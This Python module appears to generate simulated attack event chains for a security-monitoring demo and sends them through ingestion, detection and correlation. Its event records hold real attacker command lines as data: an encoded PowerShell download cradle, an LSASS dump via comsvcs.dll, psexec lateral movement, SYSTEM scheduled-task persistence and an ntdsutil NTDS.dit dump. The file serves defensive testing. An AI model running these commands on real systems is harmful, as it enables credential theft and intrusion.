import uuid
import random
from datetime import datetime, timezone, timedelta
from typing import List, Dict, Any
from sqlalchemy.orm import Session

from app.services.ingestion_service import EventIngestionService


_HOSTNAMES = [
    "WORKSTATION-042", "WORKSTATION-089", "WORKSTATION-117", "WORKSTATION-203",
    "WORKSTATION-318", "WORKSTATION-456", "WORKSTATION-521", "WORKSTATION-609",
    "WORKSTATION-773", "WORKSTATION-884", "WORKSTATION-912",
    "FINANCE-SRV-01", "DC-PRIMARY-02", "WEBAPP-NODE-07", "ENGINEERING-155",
    "HR-WS-033", "EXEC-SURFACE-01", "MARKETING-240", "OPERATIONS-099"
]

_VICTIM_USERS = [
    "victim.user@enterprise.com", "finance.lead@enterprise.com",
    "marketing.mgr@enterprise.com", "sys.admin@enterprise.com",
    "hr.specialist@enterprise.com", "engineering.dev@enterprise.com",
    "operations.coord@enterprise.com", "sales.exec@enterprise.com",
    "legal.counsel@enterprise.com", "product.owner@enterprise.com"
]

_PHISH_DOMAINS = [
    "phish-payroll-update.net", "hr-benefits-login-verify.com",
    "office365-verify-account.ru", "dropbox-file-share-invite.cn",
    "it-password-reset-portal.co", "slack-team-invite-join.net",
    "invoice-payment-urgent.cc", "zoom-meeting-join-now.com"
]

_C2_DOMAINS = [
    "c2-command-node.ru", "cobalt-strike-beacon.cn",
    "metasploit-payload.cc", "empire-listener.hk",
    "sliver-c2-relay.online", "brute-ratel-dispatch.net"
]

_MALICIOUS_IPS = [
    "198.51.100.44", "203.0.113.87", "192.0.2.156", "185.220.101.34",
    "45.155.205.233", "91.219.236.218", "103.224.182.251", "5.188.210.13"
]

_INTERNAL_IPS = [f"10.0.{random.randint(0, 20)}.{random.randint(2, 254)}" for _ in range(40)]
_SRC_EXTERNAL_IPS = [f"203.0.{random.randint(110, 120)}.{random.randint(1, 254)}" for _ in range(30)]

_THREAT_ACTORS = ["APT-29 Sim", "APT-28 Sim", "FIN-7 Sim", "CRIME-045", "TA505 Sim", "LAZARUS Sim"]
_ENRICH_SOURCES = ["VirusTotal / ThreatFox", "AlienVault OTX", "IBM X-Force Exchange", "MISP Community Feed", "Anomali ThreatStream"]

_SCENARIO_VARIANTS = [
    {
        "name": "Phishing -> Encoded PowerShell -> LSASS Dump -> C2 Beaconing",
        "variant": "classic_apt_chain"
    },
    {
        "name": "RDP Brute Force -> Lateral Movement -> Crypto Ransomware Staging",
        "variant": "ransomware_chain"
    },
    {
        "name": "Webshell Upload -> Credential Harvest -> Data Exfiltration Over DNS",
        "variant": "data_exfil_chain"
    },
    {
        "name": "USB Dropper -> Scheduled Task Persistence -> Reverse Shell",
        "variant": "usb_initial_chain"
    }
]


def _rand(namespace_list: List[str]) -> str:
    return random.choice(namespace_list)


def generate_synthetic_attack_scenario(db: Session, tenant_id: str = "tenant_default") -> Dict[str, Any]:
    now = datetime.now(timezone.utc)

    scenario = _rand(_SCENARIO_VARIANTS)
    variant = scenario["variant"]

    hostname = _rand(_HOSTNAMES)
    internal_ip = random.choice(_INTERNAL_IPS)
    victim_user = _rand(_VICTIM_USERS)
    phish_domain = _rand(_PHISH_DOMAINS)
    c2_domain = _rand(_C2_DOMAINS)
    malicious_ip = _rand(_MALICIOUS_IPS)
    external_src_ip = random.choice(_SRC_EXTERNAL_IPS)
    threat_actor = _rand(_THREAT_ACTORS)
    enrich_source = _rand(_ENRICH_SOURCES)

    # Random time offset jitter
    t_phish = now - timedelta(minutes=45 + random.randint(0, 30), seconds=random.randint(0, 60))
    t_exec = t_phish + timedelta(minutes=random.randint(8, 20), seconds=random.randint(0, 60))
    t_creds = t_exec + timedelta(minutes=random.randint(3, 12), seconds=random.randint(0, 60))
    t_dns = t_creds + timedelta(minutes=random.randint(2, 8), seconds=random.randint(0, 60))
    t_c2 = t_dns + timedelta(minutes=random.randint(3, 15), seconds=random.randint(0, 60))

    # ============ Build events based on scenario variant ============
    events_raw = []
    if variant == "classic_apt_chain":
        events_raw = [
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_phish.isoformat(),
                "source": "email_gateway",
                "event_type": "phishing_delivery",
                "severity": "medium",
                "user": victim_user,
                "src_ip": external_src_ip,
                "dst_ip": internal_ip,
                "domain": phish_domain,
                "hostname": hostname,
                "raw_data": f"Inbound email containing suspicious link: http://{phish_domain}/login.php delivered to {victim_user}"
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_exec.isoformat(),
                "source": "edr",
                "event_type": "process_creation",
                "severity": "high",
                "user": victim_user,
                "hostname": hostname,
                "src_ip": internal_ip,
                "process_name": "powershell.exe",
                "command_line": f"powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJ2h0dHA6Ly8{uuid.uuid4().hex[:8]}L3BheWxvYWQucHMxJyk=",
                "file_hash": f"{uuid.uuid4().hex}{uuid.uuid4().hex}",
                "raw_data": f"Encoded PowerShell execution spawned by WINWORD.EXE on {hostname}"
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_creds.isoformat(),
                "source": "edr",
                "event_type": "credential_dump",
                "severity": "critical",
                "user": "SYSTEM",
                "hostname": hostname,
                "src_ip": internal_ip,
                "process_name": "lsass.exe",
                "command_line": f"rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump {random.randint(500, 999)} C:\\Windows\\Temp\\lsass_{uuid.uuid4().hex[:6]}.dmp full",
                "raw_data": f"lsass process memory read detected originating from process rundll32.exe on {hostname}"
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_dns.isoformat(),
                "source": "dns",
                "event_type": "dns_query",
                "severity": "medium",
                "user": victim_user,
                "hostname": hostname,
                "src_ip": internal_ip,
                "domain": c2_domain,
                "raw_data": f"High entropy DNS resolution query for {c2_domain}"
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_c2.isoformat(),
                "source": "firewall",
                "event_type": "network_conn",
                "severity": "high",
                "user": victim_user,
                "hostname": hostname,
                "src_ip": internal_ip,
                "dst_ip": malicious_ip,
                "dst_port": random.choice([443, 8443, 8080, 4443]),
                "raw_data": f"Outbound TLS connection to suspicious external IP {malicious_ip} with self-signed certificate (JA3 anomalous)"
            }
        ]
    elif variant == "ransomware_chain":
        second_host = _rand([h for h in _HOSTNAMES if h != hostname])
        second_ip = random.choice([ip for ip in _INTERNAL_IPS if ip != internal_ip])
        events_raw = [
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_phish.isoformat(),
                "source": "firewall",
                "event_type": "brute_force",
                "severity": "high",
                "user": "administrator@enterprise.com",
                "src_ip": external_src_ip,
                "dst_ip": internal_ip,
                "hostname": hostname,
                "raw_data": f"RDP brute force: 1,247 failed login attempts in 5 min from {external_src_ip} targeting {hostname}:3389. 1 successful authentication."
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_exec.isoformat(),
                "source": "identity",
                "event_type": "lateral_movement",
                "severity": "high",
                "user": "administrator@enterprise.com",
                "hostname": hostname,
                "src_ip": internal_ip,
                "dst_ip": second_ip,
                "process_name": "mimikatz.exe",
                "command_line": f"psexec.exe \\\\{second_host} -s cmd.exe /c \"copy \\\\{hostname}\\c$\\sys.exe c:\\windows\\temp\\sys.exe\"",
                "raw_data": f"SMB lateral movement from {hostname} to {second_host} using compromised admin credentials."
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_creds.isoformat(),
                "source": "edr",
                "event_type": "scheduled_task",
                "severity": "high",
                "user": "SYSTEM",
                "hostname": second_host,
                "src_ip": second_ip,
                "process_name": "schtasks.exe",
                "command_line": f"schtasks.exe /Create /SC MINUTE /MO 5 /TN \"Windows Update Service\" /TR \"C:\\Windows\\Temp\\sys.exe\" /RU SYSTEM",
                "raw_data": f"Persistence: Suspicious scheduled task created on {second_host} pointing to unsigned executable in Temp."
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_dns.isoformat(),
                "source": "edr",
                "event_type": "file_modification",
                "severity": "critical",
                "user": "SYSTEM",
                "hostname": second_host,
                "src_ip": second_ip,
                "process_name": "sys.exe",
                "raw_data": f"High entropy file writes on {second_host} with .encrypted file extension pattern, 4,210 files modified in 120 seconds."
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_c2.isoformat(),
                "source": "dns",
                "event_type": "dns_query",
                "severity": "high",
                "hostname": second_host,
                "src_ip": second_ip,
                "domain": f"ransom-{uuid.uuid4().hex[:8]}.onion.pet",
                "raw_data": f"DNS query for suspicious ransomware payment gateway domain."
            }
        ]
    elif variant == "data_exfil_chain":
        events_raw = [
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_phish.isoformat(),
                "source": "edr",
                "event_type": "file_upload",
                "severity": "medium",
                "user": victim_user,
                "hostname": hostname,
                "src_ip": internal_ip,
                "file_hash": f"{uuid.uuid4().hex}{uuid.uuid4().hex}",
                "raw_data": f"Webshell {uuid.uuid4().hex[:6]}.aspx uploaded to /owa/auth/ on EXCHANGE-SRV-01 via unauthenticated ProxyShell vulnerability."
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_exec.isoformat(),
                "source": "identity",
                "event_type": "credential_access",
                "severity": "high",
                "hostname": hostname,
                "src_ip": internal_ip,
                "process_name": "w3wp.exe",
                "command_line": "cmd.exe /c whoami && net user /domain",
                "raw_data": f"Command execution via webshell: reconnaissance enumerating domain trusts and users."
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_creds.isoformat(),
                "source": "edr",
                "event_type": "credential_dump",
                "severity": "critical",
                "hostname": hostname,
                "src_ip": internal_ip,
                "process_name": "ntdsutil.exe",
                "command_line": "ntdsutil.exe \"ac i ntds\" \"ifm\" \"create full c:\\temp\\ntds\" q q",
                "raw_data": f"ntdsutil.exe used to create Install From Media backup of Active Directory NTDS.dit hive (credential theft)."
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_dns.isoformat(),
                "source": "dns",
                "event_type": "dns_tunnel",
                "severity": "high",
                "hostname": hostname,
                "src_ip": internal_ip,
                "domain": f"{uuid.uuid4().hex[:10]}.{c2_domain}",
                "raw_data": f"High-volume DNS TXT record queries (>4,500 in 15 min) indicative of DNS tunneling data exfiltration."
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_c2.isoformat(),
                "source": "firewall",
                "event_type": "data_exfil",
                "severity": "critical",
                "hostname": hostname,
                "src_ip": internal_ip,
                "dst_ip": malicious_ip,
                "dst_port": 53,
                "raw_data": f"Large outbound data transfer (2.3GB) to {malicious_ip}:53, far exceeding baseline DNS traffic for {hostname}."
            }
        ]
    else:  # usb_initial_chain
        events_raw = [
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_phish.isoformat(),
                "source": "edr",
                "event_type": "process_creation",
                "severity": "medium",
                "user": victim_user,
                "hostname": hostname,
                "src_ip": internal_ip,
                "process_name": "cmd.exe",
                "command_line": f"cmd.exe /c E:\\launcher.bat",
                "raw_data": f"Batch file execution originating from removable USB media E: on {hostname}."
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_exec.isoformat(),
                "source": "edr",
                "event_type": "process_injection",
                "severity": "high",
                "user": victim_user,
                "hostname": hostname,
                "src_ip": internal_ip,
                "process_name": "explorer.exe",
                "raw_data": f"Process hollowing detected: unsigned remote thread 0x{random.randint(1000, 9999):x} injected into explorer.exe from USB stage DLL."
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_creds.isoformat(),
                "source": "identity",
                "event_type": "scheduled_task",
                "severity": "high",
                "hostname": hostname,
                "src_ip": internal_ip,
                "process_name": "schtasks.exe",
                "command_line": f"schtasks.exe /Create /SC ONLOGON /TN \"WinTelemetry\" /TR \"rundll32 c:\\programdata\\mt_{uuid.uuid4().hex[:6]}.dll,Run\" /RU {victim_user}",
                "raw_data": f"User logon scheduled task registered pointing to unknown DLL in ProgramData."
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_dns.isoformat(),
                "source": "dns",
                "event_type": "dns_query",
                "severity": "medium",
                "hostname": hostname,
                "src_ip": internal_ip,
                "domain": c2_domain,
                "raw_data": f"DGA-like pseudo-random domain query for {c2_domain}."
            },
            {
                "event_id": f"sim_evt_{uuid.uuid4().hex[:8]}",
                "timestamp": t_c2.isoformat(),
                "source": "firewall",
                "event_type": "reverse_shell",
                "severity": "critical",
                "hostname": hostname,
                "src_ip": internal_ip,
                "dst_ip": malicious_ip,
                "dst_port": 4443,
                "raw_data": f"TCP socket egress to {malicious_ip}:4443 with periodic 60-second heartbeat beacon pattern, reverse shell confirmation (interactive TTY prompt)."
            }
        ]

    # Simulated records go through the same ingest → detect → correlate path as live data.
    for item in events_raw:
        item["metadata_json"] = {
            "simulated_scenario": scenario["name"],
            "variant": variant,
            "threat_actor": threat_actor,
            "is_simulated": True,
        }
    ingest_result = EventIngestionService.ingest_records(
        db=db,
        records=events_raw,
        tenant_id=tenant_id,
        is_simulated=True,
        ingest_source_id="demo-simulator",
        run_detection=True,
        run_correlation=True,
        connector_type="demo",
    )
    from app.models.incident import Incident
    incidents = (
        db.query(Incident)
        .filter(Incident.tenant_id == tenant_id, Incident.is_simulated == "true")
        .order_by(Incident.created_at.desc())
        .all()
    )
    return {
        "incident_id": incidents[0].id if incidents else None,
        "incident_ids": [i.id for i in incidents[:5]],
        "alerts_count": ingest_result.alerts_created,
        "events_count": ingest_result.accepted_count,
        "indicators_count": 0,
        "scenario": scenario["name"],
        "variant": variant,
        "asset_id": hostname,
        "threat_actor": threat_actor,
        "malicious_ip": malicious_ip,
        "c2_domain": c2_domain,
        "is_simulated": True,
        "ingest_job_id": ingest_result.job_id,
        "duplicates": ingest_result.duplicate_count,
        "incidents_created": ingest_result.incidents_created,
        "note": "All generated records are labeled simulated. No live threat-intel scores were invented.",
    }

